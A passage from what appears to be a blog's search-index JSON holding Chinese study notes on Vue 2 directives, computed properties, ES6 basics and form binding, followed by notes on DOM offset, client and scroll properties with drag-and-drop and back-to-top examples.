})\n</script>\n~~~\n\n\n\n#### v-pre\n\n+ 用于跳过这个元素和它子元素的编译过程，用于显示原本的Mustache语法\n\n~~~html\n<div id='app'>\n    <h2 v-pre>{{ message }}</h2> <!-- {{ message }} -->\n</div>\n<script>\n\tconst app = new Vue({\n        el:'#app',\n        data:{\n           message:\"hello\"\n        }\n    })\n</script>\n~~~\n\n\n\n#### v-cloak\n\n+ 某些情况下，浏览器可能会直接显示出未编译的Mustache标签\n+ cloak（斗篷）\n+ 在vue解析之前，div中有一个属性v-cloak\n+ 在vue解析之后，div中没有一个属性v-cloak\n\n~~~html\n<style>\n    [v-cloak]{\n        display:none;\n    }\t\n</style>\n\n<div id='app' v-cloak>\n    {{ message }}\n</div>\n\n<script>\n\tsetTimeout(function(){\n        const app = new Vue({\n            el:'#app',\n            data:{\n                message:'hello'\n            }\n        })\n    })\n</script>\n~~~\n\n\n\n## 2.v-bind动态绑定(p14-19)\n\n### 2.1 v-bind绑定基本属性\n\n+ 前面学习的指令主要作用是将值插入到我们的<font color='red'>模板的内容</font>中\n+ 除了内容需要动态决定外，某些属性也希望能动态绑定\n+ 该指令v-bind：\n  + 作用：动态绑定属性\n  + 缩写：`:`\n  + 预期：any（with argument）| Object（without argument）\n  + 参数：attrOrProp（optional）\n\n~~~html\n<div id='app'>\n\t<img src='{{imgsrc}}'>  <!-- 直接将{{imgsrc}}赋值给src了 -->\n    <img src='imgsrc'> <!-- 同上理 -->\n    <img v-bind:src='imgsrc'> <!-- 这样才会解析vue中的imgsrc -->、\n    <img :src='imgsrc'>  <!-- 语法糖 -->\n</div>\n~~~\n\n\n\n### 2.2 v-bind动态绑定class（对象语法）\n\n对象语法的含义是：class后面跟的是一个对象\n\n+ **用法一：直接通过`{}`绑定一个类**\n\n~~~html\n<h2 :class=\"{'active':isActive}\">Hello World</h2>\n~~~\n\n+ **用法二：可以通过判断，传入多个值**\n\n~~~html\n<h2 :class=\"{'active':isActiven,'line':isLine}\">Hello World</h2>\n~~~\n\n+ **用法三：和普通的类同时存在，并不冲突**\n\n~~~html\n<h2 class=\"title\" :class=\"{'active':isActiven,'line':isLine}\">Hello World</h2>\n~~~\n\n+ **用法四：如果过于复杂，可以放在一个methods或者computed中**\n\n~~~html\n<h2 class=\"title\" :class=\"classes\">Hello World</h2> <!-- classes是一个计算属性 -->\n\n<div id='app'>\n    <!-- <h2 v-bind:class=\"{类名1:boolean, 类名2: boolean}\"></h2>  -->\n    <h2 class='title' v-bind:class=\"{active:isActive,line:isLine}\"></h2>\n\t<h2 class='title' v-bind:class=\"getClasses()\"></h2>    \n</div>\n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            isActive:true,\n            isLine:true\n        },\n        methods:{\n            getClasses:function(){\n                return {active:this.isActive,line:this.isLine}\n            }\n        }\n    })\n</script>\n~~~\n\n\n\n### 2.3 v-bind动态绑定class（数组语法）\n\n~~~html\n<h2 class='title' :class\"['active','line']\"></h2> <!-- 与class=“title active line” 同 -->\n<h2 class='title' :class\"[active,line]\"></h2>  <!-- 此时就是变量 -->\n<h2 class='title' :class\"getClasses()\"></h2> \n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            active:'aaa',\n            line:'bbb'\n        },\n        methods:{\n            getClasses:function(){\n                return [this.active,this.line]\n            }\n        }\n    })\n</script>\n~~~\n\n\n\n### 2.4 v-bind绑定style（对象语法）\n\n+ style后面跟的是一个对象类型\n\n~~~html\n<h2 :style=\"{key(属性名,可以不加''):value(属性值,要加'')}\">{{message}}</h2>\n\n<h2 :style=\"{'font-size'(或者fontSize、-要加''):'50px'(if无''会看作变量报错)}\">{{message}}</h2>\n\n<h2 :style=\"{font-size:finalSize(当成变量使用/finalSize2+'px')}\">{{message}}</h2>\n\n<h2 :style=\"grtStyles()\">{{message}}</h2>\n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            finalSize:\"50px\",\n            finalSize2:100,\n            finalColor:\"red\"\n        },\n        methods{\n    \t\tgetStyles:function(){\n        \t\treturn {fontSize:this.finalSize,color:this.finalColor}\n    \t\t}    \n    \t}\n        \n    })\n</script>\n\n~~~\n\n\n\n### 2.5 v-bind绑定style（数组语法）\n\n+ style后面跟的是一个数组类型\n+ 多个值以‘,’分割\n\n ~~~html\n<div v-bind:style=\"[baseStyle,baseStyle2]\"></div>\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            baseStyle:{color:\"red\"},\n            baseStyle:{fontSize:'100px'}\n        }  \n    })\n</script>\n ~~~\n\n\n\n## 3. 计算属性(p20-25)\n\n### 3.1 基本使用\n\n~~~html\n<div id=\"app\">\n\t<h2>{{firstname + ' ' + lastname}}</h2>\n    <h2>{{firstname}} {{lastname}}</h2>\n    \n    <h2>{{getfullname()}}</h2>\n    \n    <h2>{{fullname}}</h2>  <!-- 计算属性 是方法 但是也当作属性看 -->\n</div>\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            firstname:'lebron',\n            lastname:'james'\n        },\n        computed:{\n            //当作属性看 所以方法的命名可以是属性的命名\n            fullname:function(){\n                return this.firstname + ' ' + this.lastname;\n            }\n        },\n        methods:{\n            //当作属性看 所以方法的命名可以是属性的命名\n            getfullname:function(){\n                return this.firstname + ' ' + this.lastname;\n            }\n        }\n    })\n</script>\n\n~~~\n\n### 3.2 复杂操作\n\n~~~html\n<div id=\"app\">\n\t<h2>书的总价 {{totalprice}}</h2>\n</div>\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            books:[\n                {id:11,name:\"红宝书\",price:119},\n                {id:12,name:\"红宝书2\",price:100},\n                {id:13,name:\"红宝书3\",price:95},\n                {id:14,name:\"红宝书4\",price:45}\n            ]\n        },\n        computed:{\n            //当作属性看 所以方法的命名可以是属性的命名\n            totalprice:function(){\n                let res = 0;\n                for(let i = 0 ; i < this.books.length ; i++){\n                    res += this.books[i].price\n                }\n                return res;\n            }\n        }\n    })\n</script>\n~~~\n\n### 3.3 计算属性的setter和getter\n\n+ 每个计算属性都包含一个setter和getter\n+ 上述例子只使用了getter\n+ 某些情况下也会需要setter方法（不常用）\n+ 例如：\n\n~~~html\n<div id=\"app\">    \n    <h2>{{fullname}}</h2>  <!-- 就算是有get set 也不加() -->\n</div>\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            firstname:'lebron',\n            lastname:'james'\n        },\n        computed:{\n            fullname:{\n                set:function(newname){\n                    const names = newname.split(' ');\n                    this.fristname = names[0];\n                    this.lastname= names[1];\n                },\n                get:function(){\n                    return this.firstname + ' ' + this.lastname;\n                }\n            }\n            \n            //因为一般只有get属性 只读 所以就可以简写成下面\n          \t//fullname:{\n            //    get:function(){\n            //        return this.firstname + ' ' + this.lastname;\n            //    }\n            //}\n            //fullname:function(){\n            //    return this.firstname + ' ' + this.lastname;\n            //}\n        }\n    })\n</script>\n~~~\n\n### 3.4 计算属性的缓存\n\n计算属性和methods的区别 \n\n在多次调用时：\n\n+ 计算属性只会调用一次，内部有缓存，如果值不变，就不会再调用，会直接使用，性能比较高\n+ methods会调用多次，每次都会重新计算，性能较低\n\n所以更多使用计算属性会比较好\n\n\n\n## 4.es6补充（p26-29）\n\n### 4.1 let/var 块级作用域\n\n+ 变量作用域：变量能够使用的范围\n\n  + 没有块级作用域引起的问题：if的块级\n\n  + 没有块级作用域引起的问题：for的块级\n\n    ~~~js\n    var btns = document.querySelector('button');\n    for(var i = 0; i < btns.length; i++){\n         //因为i的作用域问题  所以会i一直都是btns.length\n        btns[i].addEventListener(\"click\",function(){\n            console.log('第' + i + '个按钮被点击' ); \n        })\n        \n        //解决一：闭包（立即执行函数）\n        //原因：函数是一个作用域\n        (function(i){\n         \tbtns[i].addEventListener(\"click\",function(){\n            \tconsole.log('第' + i + '个按钮被点击' ); \n        \t})\n        })(i)\n        \n    }\n    ~~~\n\n  \n\n+ es5之前因为if和for都没有块级作用域的概念，所以再很多时候，都必须借助于function的作用域来解决应用外面变量的问题\n\n+ es6中，let有if和for的块级作用域\n\n### 4.2 const的使用\n\nes6开发中，优先使用const，只有需要改变一个标识符时才使用let\n\n+ 给const修饰的标识符被赋值后，不能再改变\n+ 再使用const定义标识符，必须进行赋值\n+ 常量的含义是指向对象不能修改，但是对象内部的属性可以修改\n\n\n\n### 4.3 对象字面量的增强写法\n\n~~~js\nconst obj = new Object();\n\n//字面量\nconst obj = {\n    \n}\n~~~\n\n#### 1.属性的增强写法\n\n~~~js\nconst name = 'why';\nconst age = 18;\nconst height = 1.88;\n\n//es5的写法\nconst obj = {\n    name:name,\n    age:age,\n    height:height\n}\n\n//es6的写法\nconst obj ={\n    name,\n    age,\n    height\n}\n~~~\n\n#### 2.函数的增强写法\n\n~~~js\n//es5的写法\nconst obj = {\n    run:function(){\n        \n    },\n    eat:function(){\n        \n    }\n}\n\n//es6的写法\nconst obj = {\n    run(){\n        \n    },\n    eat(){\n        \n    }\n}\n~~~\n\n\n\n## 5. v-on事件监听（p30-32）\n\n### 5.1 v-on基本使用\n\n+ 作用：绑定事件监听器\n\n+ 缩写：@\n\n+ 预期：Function|Inline Statement|Object\n\n+ 参数：event\n\n  \n\n### 5.2 v-on参数问题\n\n+ $event\n\n~~~html\n<!-- 1.事件调用的方法没有参数 ()可省略-->\n<button @click=\"btnClick()\">按钮1</button>\n<button @click=\"btnClick\">按钮1</button>\n\n<!-- 2.有参数时,若只写()没有传参 那么与普通对象一样 形参为undefined -->\n<!-- 若没有写() vue会默认将浏览器生产的event事件对象作为参数传入方法 -->\n<button @click=\"btn2Click(123)\">按钮2</button>\n<button @click=\"btn2Click()\">按钮2</button>\n<button @click=\"btn2Click\">按钮2</button>\n\n<!-- 3.在方法定义时，需要参数又需要event -->\n<!-- 在调用方法，手动获取到浏览器参数的event对象：$event -->\n<button @click=\"btn3Click(123,$event)\">按钮3</button>\n\n<script>\n const app = new Vue({\n     el:\"#app\",\n     data:{},\n     methods:{\n         btnClick(){\n             \n         },\n         btn2Click(abc){\n             console.log(\"----\",abc);\n         },\n         btn3Click(abc,event){\n             console.log(abc,event);\n         }\n     }\n })\n</script>\n~~~\n\n\n\n### 5.3 v-on 修饰符\n\n+ .stop - 调用event.stopPropagation()\n+ .prevent - 调用event.preventDefault()\n+ .{keyCode | keyAlias} -只当事件是从特定键触发时才触发回调\n+ .native - 监听组件根元素的原生事件\n+ .once - 只触发一次回调\n\n~~~html\n<div id='app'>\n    <!-- 1..stop修饰符的使用 -->\n\t<div @click=\"divClick\">\n        <!-- if 不加 .stop 点击按钮也会点击到div 会触发事件冒泡 .stop 阻止事件冒泡-->\n        <button @click.stop='btnClick'>按钮</button>\n    </div>\n    \n    <!-- 2..prevent -->\n    <form action=\"baidu\">\n        <!-- if 不加 会自动提交表单 -->\n        <input type='submit' value='提交' @click.prevent='submitClick'>\n    </form>\n    \n    <!-- 3. 监听某个键盘的键帽 keyup 松开键盘的时候触发-->\n    <input type=\"text\" @keyup.enter=\"keyup\">\n    \n    <!-- 4. .once 只会触发一次-->\n    <button @click='btnClick'>按钮</button>\n</div>\n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        methods:{\n            btnClick(){\n                console.log(\"btnClick\");\n            },\n            divClick(){\n                console.log(\"divClick\");\n            },\n            submitClick(){\n                console.log(\"submitClick\");\n            },\n            keyup(){\n                console.log(\"keyup\");\n            }\n        }\n    })\n</script>\n~~~\n\n\n\n## 6.条件判断v-if、v-else-if、v-else、v-show(p33-36)\n\n+ 这三个指令与JavaScript的条件语句if、else、else if、类似\n+ Vue的条件指令可以根据表达式的值在DOM中渲染或销毁元素或组件\n\n+ v-if的原理：\n  + v-if的值为false时，对应的元素及其子元素不会渲染\n  + 不会有对应的标签出现在DOM中\n\n### 6.1 v-if、v-else\n\n~~~html\n<div id=\"app\">\n    <h2 v-if=\"isShow\">isShow为true时显示</h2>\n    <h1 v-else>isShow为false时显示</h1>\n    \n    <!-- 如果有这样的情况 建议用computed做 不建议使用这么复杂的标签做 -->\n    <p v-if=\"score >= 90\">优秀</p>\n    <p v-else-if=\"score >= 80\">良好</p>\n    <p v-else-if=\"score >= 60\">及格</p>\n    <p v-else>不及格</p>\n</div>\n<script>\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            isShow:true,\n            score:99,\n        }\n    })\n</script>\n~~~\n\n### 6.2 账号/邮箱登录 input复用的问题解决（p34-p35）\n\n+ 在两个input上+不同的key的值就可以了\n+ Vue ：在Dom渲染页面的时候会经过一层虚拟dom然后将相似的不会冲突的元素只渲染一遍\n+ 所以用不同的key把两个分开\n+ 这样就不会出现切换input时 input里面的value还存在的问题了\n\n\n\n### 6.3 v-show\n\nv-if：为false时，不会存在dom，删除/重新创建\n\nv-show：为flase，display：none；block/none    切换频率高时，使用\n\n\n\n\n\n## 7.循环遍历（p37-44）\n\n### 7.1 v-for 遍历数组和对象\n\n1. 数组: `<p v-for=\"(item,index) in arr\">{{ index+1 }} {{ item }}</p>`\n\n2. 对象:`<li v-for=\"(value,key,index) in info\"></li>`\n\n\n\n### 7.2 v-for绑定与不绑定key的区别\n\n##### 插入函数 splice : \n\n~~~js\nlet letters = [\"A\",\"B\",\"C\",\"D\",\"E\"];\nletters.splice(2,2); //返回[\"C\",\"D\"]\n// letters = [\"A\",\"B\",\"E\"];\n\nlet letters = [\"A\",\"B\",\"C\",\"D\",\"E\"];\nletters.splice(2,0,\"F\");  //返回[]\n//[\"A\",\"B\",\"F\",\"C\",\"D\",\"E\"]\n~~~\n\n##### 绑定key的格式：\n\n~~~html\n<li v-for=\"item in letters\" :key=\"item\">{{ item }}</li>\n~~~\n\n##### 组件的key属性\n\n+ 官方推荐在使用`v-for`时，给对应的元素/组件添加上`:key`属性\n\n+ >  2.2.0+ 的版本里，**当在组件中使用** v-for 时，key 现在是必须的。因为没有key来保障循环中的唯一性，那么组件则会被打乱。\n  >\n  > 当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “**就地复用**” 策略。如果数据项的顺序被改变，Vue将**不是移动 DOM 元素来匹配数据项的顺序**， 而是**简单复用此处每个元素**，并且确保它在特定索引下显示已被渲染过的每个元素。\n  >\n  > 为了给 Vue 一个提示，**以便它能跟踪每个节点的身份，从而重用和重新排序现有元素**，你需要为每项提供一个唯一 key 属性。\n\n+ 原因：和Vue的虚拟DOM的Diff（顺序表的插入）算法有关\n\n+ 所以我们需要使用key来给每个节点做一个唯一标识符，Diff算法就可以正确的识别此节点，找到正确的位置区插入新的节点\n\n+ key的作用主要是为了高效的更新虚拟DOM\n\n### 7.3 那些数组的方法是响应式的\n\n1. push() ：可以跟多个\n2. pop()  :删除数组最后一个元素\n3. shift()：删除数组的第一个元素\n4. unshift()：在第一个前面增加元素 ，可以传多个值\n5. splice()：删除/插入/替换元素\n6. sort()：\n7. reverse()：\n\n+ <font color='red'>注意：通过索引值修改数组中的元素 这个方法不是响应式的</font>\n\n  > 页面的元素不会响应式地改变 但是控制台上面的数据就换了\n\n  + 可以使用splice \n  + 使用Vue.set(this.letters,0,'bbbb');\n\n\n\n### 7.4 作业+案例\n\n+ 保留两位小数 `{{ item.price.toFixed(2) }}`\n+ 过滤器： （使用过滤器做这个功能会比较适合）\n\n~~~html\n<td>{{ '￥' + item.price.toFixed(2) }}</td>\n<td>{{ getFinalPrice(item.price) }}</td>\n<!-- <td>{{ item.price | 过滤器 }}</td>  过滤器是有参数的 直接把|前面的作为参数传入  --> \n<td>{{ item.price | showPrice }}</td>\n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            book:[...],\n        },\n        methods:{\n        \tgetFinalPrice(price){\n            \treturn '￥' + price.toFixed(2);\n        \t}          \n        },\n        filters:{\n        \tshowPrice(price){\n        \t\treturn '￥' + price.toFixed(2);\n    \t\t}                \n        }\n             \n    })\n</script>\n~~~\n\n\n\n## 8. JavaScript高阶函数的使用（p45）\n\n### 8.1 循环\n\n+ for循环\n+ for-in\n+ for-of\n\n### 8.2filter/map/reduce\n\n+ filter中的回调函数有一个要求：必须返回一个boolean值\n\n+ true时：函数内部会自动将这次回调的n加入到新的数组中\n\n+ false时：函数内部会过滤掉这次的n\n\n  ~~~js\n  const nums = [10,20,50,111,5555,12];\n  \n  //选出<100的数 * 2 相加\n  \n  //1.filter 的使用\n  let newNums = nums.filter(function(n){\n      return n<100;\n  })\n  console.log(newNums)\n  \n  //2.map的使用\n  let new2Nums = newNums.map(function(n){\n      return n*2;\n  })\n  console.log(new2Nums)\n  \n  //3.reduce的使用\n  //对数组的全部内容进行汇总 第二个参数是初始值\n  let total = new2Nums.reduce(function(preValue,n){\n  \treturn preValue + n;\n  },0)\n  \n  \n  //全部汇总 --> 函数式编程\n  let total = nums.filter(function(n){\n      return n<100;\n  }).map(function(n){\n      return n*2;\n  }).reduce(function(preValue,n){\n      return preValue + n\n  },0)\n  \n  //使用简写\n  let total = nums.filter(n => n<100).map(n => n*2).reduce((pre,n) => pre +n );\n  ~~~\n\n\n\n## 9.表单绑定v-model(p46-51)\n\n+ Vue中使用v-model指令来实现表单元素和数据的双向绑定\n\n### 9.1 v-model 原理\n\n+ v-model其实是一个语法糖，它的本质是包含两个操作：\n\n  1. v-bind绑定value属性\n  2. v-on指令给当前元素绑定input事件\n\n  ~~~html\n  <input type='text' v-model=\"message\">\n  <!-- 等于 -->\n  <input type='text' v-bind:value=\"message\" v-on:input=\"message=$event.target.value\">\n  <!-- 等于 -->\n  <input type='text' :value=\"message\" @input=\"valueChange\">\n  \n  <script>\n  \tconst app = new Vue({\n          el:\"#app\",\n          data:{\n              message:\"hello\",\n          },\n          methods:{\n              valueChange(event){\n                  this.message = event.target.value;\n              }\n          }\n      })\n  </script>\n  ~~~\n\n### 9.2 v-model 结合radio类型\n\n~~~html\n<div id=\"app\">\n    <!-- 因为使用了v-model所以可以不使用name -->\n    <label for='male'>\n    \t<input type=\"radio\" id=\"male\" value=\"男\" v-model='sex'>男\n    </label>\n    <label for='female'>\n    \t<input type=\"radio\" id=\"female\" value=\"女\" v-model='sex'>女\n    </label>\n    <!-- 因为vue里的sex有值 所以会有默认选上的 -->\n    <h2>您选择的性别为：{{ sex }}</h2>\n</div>\n\n<script>\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:\"hello\",\n            sex:'女'\n        }\n    })\n</script>\n~~~\n\n### 9.3 v-model 结合checkbox类型\n\n~~~html\n<div id=\"app\">\n    <!-- 1.checkbox 单选框 -->\n\t<label for=\"agree\">\n        <input type=\"checkbox\" id=\"agree\" v-model=\"isAgree\">同意协议\n    </label>\n    <h2>您的选择是:{{ isAgree }}</h2>\n    <button :disable=\"!isAgree\">下一步</button>\n    \n    <!-- 2.checkbox 多选框 -->\n    <input type=\"checkbox\" value=\"篮球\" v-model=\"bobbies\">篮球\n    <input type=\"checkbox\" value=\"足球\" v-model=\"bobbies\">足球\n    <input type=\"checkbox\" value=\"兵乓球\" v-model=\"bobbies\">兵乓球\n    <input type=\"checkbox\" value=\"羽毛球\" v-model=\"bobbies\">羽毛球\n    <h2>您的爱好是：{{ hobbies }}</h2>\n</div>\n<script>\n\tlet app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n            isAgree:false,\n            hobbies:[]\n        }\n    })}\n</script>\n~~~\n\n### 9.4 v-model结合select类型\n\n~~~html\n<div id='#app'>\n    <!-- 1.选择一个 -->\n    <select name=\"abc\" v-model=\"fruit\">\n        <option value=\"苹果\">苹果</option>\n        <option value=\"香蕉\">香蕉</option>\n        <option value=\"榴莲\">榴莲</option>\n        <option value=\"葡萄\">葡萄</option>\n    </select>\n    <h2>您选择的水果是：{{fruit}}</h2>\n    \n    <!-- 2.选择多个 -->\n    <select name=\"abc\" v-model=\"fruits\" multiple>\n        <option value=\"苹果\">苹果</option>\n        <option value=\"香蕉\">香蕉</option>\n        <option value=\"榴莲\">榴莲</option>\n        <option value=\"葡萄\">葡萄</option>\n    </select>\n    <h2>您选择的水果是：{{fruit}}</h2>\n</div>\n\n<script>\n\tlet app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n            friut:\"香蕉\", //所以香蕉会默认选上\n            fruits:[]\n        }\n    })}\n</script>\n~~~\n\n### 9.5 值绑定\n\n+ 与v-bind相似\n\n~~~html\n<label v-for=\"item in originHobbies\" :for=\"item\">\n\t<input type=\"checkbox\" :value:\"item\" :id=\"item\" v-model=\"hobbies\">{{item}}\n</label>\n~~~\n\n### 9.6 修饰符\n\n##### .lazy修饰符\n\n+ 默认情况下，v-model默认是在input事件中同步输入框的数据的\n\n  > 即一旦有数据改变 data中的数据就会自动发生改变\n\n+ lazy修饰符可以让数据在失去焦点或回车时才会更新\n\n##### .number修饰符\n\n+ 默认情况下，在输入框中输入的内容，都会被当作字符串类型进行处理\n+ 如果希望处理的是数字类型 type=”number“的，那么最好直接将内容当作数字处理\n+ number修饰符可以让输入框中输入的内容自动转换成数字类型\n\n##### .trim修饰符\n\n+ 如果输入的内容首尾有很多空格，通常希望将其去除\n+ trim修饰符可以过滤内容左右两边的空格\n\n\n\n~~~html\n<!-- lazy -->\n<input type=\"text\" v-model.lazy=\"message\">\n\n<!-- number -->\n<input type=\"number\" v-model.number=\"age\">\n\n<!-- trim -->\n<input type=\"text\" v-model.trim=\"name\">\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["vue"],"categories":["learningNotes"]},{"title":"js webAPI--offset、client、scroll","url":"/learningNotes/js/三大系列","content":"\n### 1.元素偏移量offset系列\n\n#### 1.1 offset概述\n\noffset就是偏移量的意思，使用offset系列相关属性可以<font color='red'>动态</font>的得到该元素的位置（偏移）、大小等。\n\n* 获取元素距离**带有定位**的父元素的位置\n* 获得元素自身的大小\n* 返回的数值**不带单位**\n\noffset 系列常用属性：\n\n| offset系列常用属性   | 作用                                                   |      |\n| -------------------- | ------------------------------------------------------ | ---- |\n| element.offsetParent | 返回作为该元素**带有定位**的父级元素 if都无 则返回body |      |\n| element.offsetTop    | 返回元素相对**带有定位**父元素上方的偏移               |      |\n| element.offsetLeft   | 返回元素相对**带有定位**父元素左边框的偏移             |      |\n| element.offsetWidth  | 返回自身包括padding、边框、内容区的宽度，不带单位      |      |\n| element.offsetHeight | 返回自身包括padding、边框、内容区的高度，不带单位      |      |\n\n~~~html\n    <style>        \n        .father {\n            position: relative;\n            width: 200px;\n            height: 200px;\n            margin: 150px;\n            background-color: antiquewhite;\n        }\n        \n        .son {\n            width: 100px;\n            height: 100px;\n            margin: 20px;\n            background-color: brown;\n        }\n    </style>\n</head>\n\n<body>\n    <div class=\"father\">\n        <div class=\"son\"></div>\n    </div>\n    <script>\n        let father = document.querySelector('.father');\n        let son = document.querySelector('.son');\n        //1.可以得到元素的偏移量\n        console.log(father.offsetTop); //150 if加上padding 150\n        console.log(son.offsetLeft); //if.father 没有定位 : 170  if.father 加上定位 :20 if.father 加上padding 40\n\n        //2.可以得到元素的大小\n        console.log(father.offsetHeight); //240  包含padding+border+width\n\n        //3.返回带有定位的父元素 or 返回body\n        console.log(son.offsetParent); //返回最近一级有定位的父亲\n        console.log(son.parentNode); //返回亲父亲\n    </script> \n~~~\n\n#### 1.2 offset 与 style 区别\n\noffset：\n\n+ offset 可以得到任意样式表中的样式值\n+ offset 系列获得的数值是没有单位的\n+ offsetWidth 包含padding + border + width\n+ offsetWidth 等属性是只读属性，只能获取不能赋值\n+ <font color='red'>所以，我们想要获取元素大小位置，用 offset 更合适</font>\n\n\n\nstyle：\n\n+ style 只能得到行内样式表中的样式值\n+ style.width 获得的是带有单位的字符串\n+ style.width 获得不包含 padding 和border 的值\n+ style.width 是可读写属性，可以获取也可以赋值\n+ <font color='red'>所以，我们想要给元素更改值，则需要用style</font>\n\n\n\n~~~html\n<style>\n    .box{\n        width:200px;\n        height:200px;\n    }\n</style>\n<html>\n    <div class='box'></div>\n</html>\n<script>\n\tlet box = document.querySelector('.box');\n    console.log(box.offsetWidth); //200\n    console.log(box.style.width); //若无行内 则不输出 if .box加上 style='width：200px'  200px\n    //offsetwidth 赋值 对box/12行 输出 无影响\n    //.style.width 就会改值\n</script>\n~~~\n\n#### 1.3  案例之获取鼠标相对于盒子的位置\n\n> 盒子在页面中的距离 box.offsetLeft box.offsetTop\n>\n> 鼠标在页面中的坐标 e.pageX e.pageY\n\n~~~html\n    <style>\n        * {\n            margin: 0;\n            margin: 0;\n        }\n        \n        .box {\n            width: 200px;\n            height: 200px;\n            margin: 50px;\n            background-color: brown;\n        }\n    </style>\n\n    <div class=\"box\"></div>\n\n    <script>\n        let box = document.querySelector('.box');\n        box.addEventListener('click', function(e) {\n            let x = e.pageX - box.offsetLeft;\n            let y = e.pageY - box.offsetTop;\n            console.log(x, y);\n        })\n    </script>\n~~~\n\n#### 1.4 案例之模态框的拖拽\n\n原理：鼠标按下并且移动，松开鼠标\n\n事件：鼠标按下mousedown 鼠标移动mousemove 鼠标松开mouseup\n\n过程：鼠标移动过程中，获得最新的值赋值给模态框的left和top值\n\n模态框的位置：鼠标的坐标减去鼠标在盒子内的坐标\n\n~~~html\n    <style>\n        * {\n            padding: 0;\n            margin: 0;\n        }\n        \n        div {\n            position: relative;\n            top: 50%;\n            left: 50%;\n            transform: translate(-50%, 50%);\n            width: 300px;\n            height: 150px;\n            background-color: plum;\n        }\n        \n        .hide {\n            position: absolute;\n            top: 0px;\n            right: 5px;\n        }\n    </style>\n\n    <p class=\"show\">点击弹出</p>\n    <div class=\"model\">\n        <span class=\"hide\">x</span>\n    </div>\n\n    <script>\n        let show = document.querySelector('.show');\n        let model = document.querySelector('.model');\n        let hide = document.querySelector('.hide');\n\n        show.addEventListener('click', function() {\n            model.style.display = 'block';\n        })\n\n        model.addEventListener('mousedown', function(e) {\n            //1.鼠标按下，获得鼠标在盒子内的坐标 —— 不变的\n            let clickX = e.pageX - model.offsetLeft;\n            let clickY = e.pageY - model.offsetTop;\n            // console.log(clickX, clickY);\n            //2.鼠标移动过程中，获得最新的值 变的长度-不变的长度 赋值给模态框的left和top值\n            document.addEventListener('mousemove', move);\n\n            function move(ec) {\n\n                model.style.left = ec.pageX - clickX + 'px';\n                model.style.top = ec.pageY - clickY + 'px';\n            }\n\n            //3.鼠标弹起 移除鼠标移动事件\n            document.addEventListener('mouseup', function() {\n                document.removeEventListener('mousemove', move);\n            })\n        })\n\n        hide.addEventListener('click', function() {\n            this.arentNode.style.display = 'none';\n        })\n    </script>\n~~~\n\n\n\n### 2.元素可视区client系列 \n\nclient就是客户端的意思，我们使用client系列的相关属性来获取元素可视区的相关信息。通过client系列的相关属性可以动态的得到该元素的边框大小、元素大小等。\n\n| client系列属性       | 作用                                                    |\n| -------------------- | ------------------------------------------------------- |\n| element.clientTop    | 返回元素上边框的大小                                    |\n| element.clientLeft   | 返回元素左边框的大小                                    |\n| element.clientWidth  | 返回自身包括padding、内容区的宽度、不包含边框，不带单位 |\n| element.clientHeight | 返回自身包括padding、内容区的高度、不包含边框，不带单位 |\n\n\n\n### 3.元素scroll系列\n\n#### 3.1元素scroll系列属性\n\nscroll就是滚动的的意思，使用scroll系列相关属性可以动态得到该元素的大小、滚动距离等。\n\n| scroll系列属性       | 作用                                 |\n| -------------------- | ------------------------------------ |\n| element.scrollTop    | 返回被卷去的上侧距离，不带单位       |\n| element.scrollLeft   | 返回被卷去的左侧距离，不带单位       |\n| element.scrollWidth  | 返回自身实际宽度 不含边框，不带单位  |\n| element.scrollHeight | 返回自身实际高度，不含边框，不带单位 |\n\n> element.scrollWidth ：if内容超过宽度 则比宽度大，包含padding，可以说是实际内容的大小\n\n<img src='https://s1.328888.xyz/2022/04/09/XnWs2.png' style=\"zoom:50%;\" >\n\n#### 3.2 页面被卷去的头部\n\n如果浏览器的高/宽度不足以显示整个页面时，会自动出现滚动条。当滚动条向下滚动时，页面上面被隐藏掉的高度，称为页面被卷去的头部。滚动条在滚动时会触发onscroll事件。\n\n~~~js\ndiv.addEventListener('scroll',function(){\n    console.log(div.scrollTop);\n})\n~~~\n\n\n\n#### 3.3 案例之返回顶部\n\n+ 需要用到页面滚动事件scroll 因为是<font color='red'>页面滚动，所以事件源是document</font>\n+ 滚动到某个位置，就是判断页面被卷去的上部值\n+ <font color='red'>页面被卷去的头部：可以通过window.pageYOffset获得</font> (如果是页面被卷曲的左侧 <font color='red'>window.pageXOfffset</font>)\n+ 注意，<font color='red'>元素</font>被卷去的头部是<font color='red'>element.scrollTop</font>，如果是<font color='red'>页面</font>被卷去的头部则是<font color='red'>window.pageYOffset</font>\n\n~~~html\n    <div class=\"slider-bar\">\n        <span class=\"goBack\">返回顶部</span>\n    </div>\n    <div class=\"header w\">头部区域</div>\n    <div class=\"banner w\">banner区域</div>\n    <div class=\"main w\">主体部分</div>\n\n    <script>\n        //1.获取元素\n        var sliderbar = document.querySelector('.slider-bar');\n        var banner = document.querySelector('.banner');\n\n\n        //但我们侧边栏固定定位之后应该变化的值\n        let tops = sliderbar.offsetTop - banner.offsetTop;\n        //获取main 主体元素\n        var main = document.querySelector('.main');\n        var goBack = document.querySelector('.goBack');\n\n        //2.页面滚动事件 scroll\n        document.addEventListener('scroll', function() {\n\n            //3.当页面被卷去的头部   大于等于banner区域  侧边栏改为固定定位\n            if (window.pageYOffset >= banner.offsetTop) {\n                sliderbar.style.position = 'fixed';\n                sliderbar.style.top = tops + 'px'; //tops 得再外面定义 不然值会变的\n            } else {\n                sliderbar.style.position = 'absolute';\n                sliderbar.style.top = '300px';\n            }\n\n\n            //4.当页面滚动到main 盒子就显示goback模块\n            if (window.pageYOffset >= main.offsetTop) {\n                goBack.style.display = 'block';\n            } else {\n                goBack.style.display = 'none';\n            }\n\n        